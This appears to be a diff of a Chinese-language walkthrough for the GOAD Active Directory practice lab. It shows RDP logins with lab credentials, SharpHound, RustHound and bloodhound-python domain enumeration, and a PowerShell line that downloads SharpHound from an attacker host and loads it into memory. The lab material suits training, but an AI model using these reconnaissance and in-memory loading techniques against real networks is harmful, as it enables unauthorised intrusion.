@@ -649,10 +649,7 @@ impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_BAD_IN
 
 所以添加参数--auth-method ntml
 
-
 * --auth-method {auto,ntlm,kerberos} 身份验证方法。强制使用Kerberos或NTLM，或者使用自动模式，在Kerberos失败时使用NTLM
-
-
 
 ### BloodHound使用
 
@@ -701,10 +698,13 @@ MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 
 ```bash
 xfreerdp /u:hodor /p:hodor /d:north /v:192.168.56.22 /cert-ignore
 ```
+
 但靶场设计者却提供了如下指令，jon.snow是域用户并且是mssql_admin
+
 ```bash
 xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
 ```
+
 * C:\vagrant 文件夹会自动安装在虚拟机上，这将简化文件传输
 * 我们将启动 Sharphound 来检索域名信息
 
@@ -713,6 +713,7 @@ xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
 .\SharpHound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
 .\SharpHound.exe -d essos.local -c all --zipfilename bh_essos.zip
 ```
+
 <details>
 <summary>展开查看</summary>
 <pre><code class="powershell">
@@ -810,6 +811,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1/Shar
 $assem = [System.Reflection.Assembly]::Load($data)
 [Sharphound.Program]::Main("-d north.sevenkingdoms.local -c all".Split())
 ```
+
 ### AutoBloody[待补充]
 
 ### RustHound
@@ -819,6 +821,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 ```bash
 rusthound -d north.sevenkingdoms.local -u 'brandon.stark' -p 'iseedeadpeople' -o ./north.sevenkingdoms.local --adcs -z
 ```
+
 ```bash
 bloodhound-python --zip -c All -d north.sevenkingdoms.local -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.local -ns 192.168.56.11
 ```
